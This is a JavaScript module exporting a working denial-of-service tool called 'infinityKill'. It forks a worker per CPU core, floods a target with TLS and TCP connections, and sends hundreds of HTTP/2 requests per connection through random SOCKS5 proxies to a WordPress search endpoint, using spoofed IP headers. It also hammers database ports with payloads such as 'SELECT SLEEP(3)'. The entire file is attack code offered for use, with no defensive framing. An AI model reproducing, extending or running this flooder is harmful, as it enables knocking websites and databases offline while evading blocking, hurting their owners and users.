const cluster = require('cluster');
const os      = require('os');
const http2   = require('http2-wrapper');
const tls     = require('tls');
const net     = require('net');
const fs      = require('fs');
const { SocksProxyAgent } = require('socks-proxy-agent');

const proxies = fs.readFileSync('./proxy.txt','utf8').split(/\r?\n/).filter(Boolean);
const randProxy=()=>proxies[Math.floor(Math.random()*proxies.length)];
const randIP  =()=>`${R(11,255)}.${R(0,255)}.${R(0,255)}.${R(2,254)}`;
const R=(min,max)=>Math.floor(Math.random()*(max-min+1))+min;

function cpuKill(ip, port, duration) {
  const end = Date.now() + duration*1000;
  while(Date.now() < end){
    const socket = tls.connect({
      host: ip,
      port: port,
      servername: ip,
      rejectUnauthorized: false,
      ciphers: 'AES256-GCM-SHA384:AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384'
    }, ()=>{
      socket.write(`GET / HTTP/1.1\r\nHost: ${ip}\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/12${R(0,9)}.0.${R(1000,9999)}.${R(10,99)} Safari/537.36\r\nConnection: close\r\n\r\n`);
      socket.end();
    });
    socket.on('error',()=>{});
  }
}

function ioKill(host, port, duration) {
  const end = Date.now() + duration*1000;
  (function run(){
    if(Date.now() > end) return;
    const agent = new SocksProxyAgent(`socks5://${randProxy()}`);
    const client = http2.connect(`https://${host}:${port}`, {agent, settings:{maxConcurrentStreams: 500}});
    for(let i=0;i<500;i++){
      const req = client.request({
        ':path': `/wp-json/wp/v2/posts?search=` + randIP() + '&rand=' + Math.random().toString(36).substr(2,9),
        ':method':'GET',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/12'+R(0,9)+'.0.'+R(1000,9999)+'.'+R(10,99)+' Safari/537.36',
        'x-forwarded-for': randIP(),
        'x-real-ip': randIP(),
        'accept': '*/*',
        'accept-encoding': 'gzip, deflate, br',
        'cache-control': 'no-cache'
      });
      req.on('response', ()=> req.close());
      req.on('error', ()=>{});
      req.end();
    }
    client.close();
    setImmediate(run);
  })();
}

function connKill(ip, port, duration) {
  const end = Date.now() + duration*1000;
  while(Date.now() < end){
    const s = net.connect({host: ip, port: port, timeout: 100}, ()=>{
      s.write(`GET / HTTP/1.1\r\nHost: ${ip}\r\n\r\n`);
      s.end();
    });
    s.on('error',()=>{});
  }
}

function dbKill(ip, duration) {
  const end = Date.now() + duration*1000;
  const payloads = [
    `SELECT SLEEP(3); -- `,
    `PING\r\n`,
    `GET /bigkey\r\n`,
    `SHOW PROCESSLIST;`
  ];
  const ports = [3306, 6379, 5432, 27017];
  while(Date.now() < end){
    ports.forEach(p=>{
      payloads.forEach(pl=>{
        const s = net.connect({host: ip, port: p, timeout: 500}, ()=>{
          s.write(pl);
          s.end();
        });
        s.on('error',()=>{});
      });
    });
  }
}

function infinityKill(ip, hostHeader, duration) {
  if(cluster.isMaster){
    console.log(`[INFINITY] Spawning ${os.cpus().length} workers…`);
    for(let i=0;i<os.cpus().length;i++) cluster.fork();
  }else{
    cpuKill(ip, 443, duration);
    ioKill(hostHeader, 443, duration);
    connKill(ip, 443, duration);
    dbKill(ip, duration);
  }
}

module.exports = { infinityKill };